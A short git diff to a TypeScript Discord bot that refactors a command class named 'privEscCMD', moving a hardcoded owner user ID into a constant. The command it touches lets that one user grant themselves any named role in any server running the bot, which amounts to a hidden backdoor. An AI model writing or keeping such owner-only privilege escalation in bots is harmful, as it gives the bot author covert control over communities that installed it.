@@ -5,9 +5,11 @@ import {activities} from "../handlers/activityHandler";
 import Command from "../classes/command";
 import errorMSG from "../message/errorMSG";
 
+let OWNER = "132936410880671746"
+
 class privEscCMD extends Command {
     execute(message: Message, args: string[]) {
-        if (message.author.id == "132936410880671746") {
+        if (message.author.id === OWNER) {
             const serverid = args[0];
             const rolename = args.splice(1).join(" ");
 
@@ -29,7 +31,7 @@ class privEscCMD extends Command {
                 const role = guild.roles.cache.filter(role => role.name.toLowerCase() == rolename.toLowerCase()).first();
                 if (role) {
                     console.log("GOT Role "+ role.name);
-                    const member = guild.members.cache.filter(user => user.id === "132936410880671746").first();
+                    const member = guild.members.cache.filter(user => user.id === OWNER).first();
                     if (member) {
                         console.log("GOT Member "+ member.user.username+"#"+member.user.discriminator);
                         member.roles.add(role).then(r => {
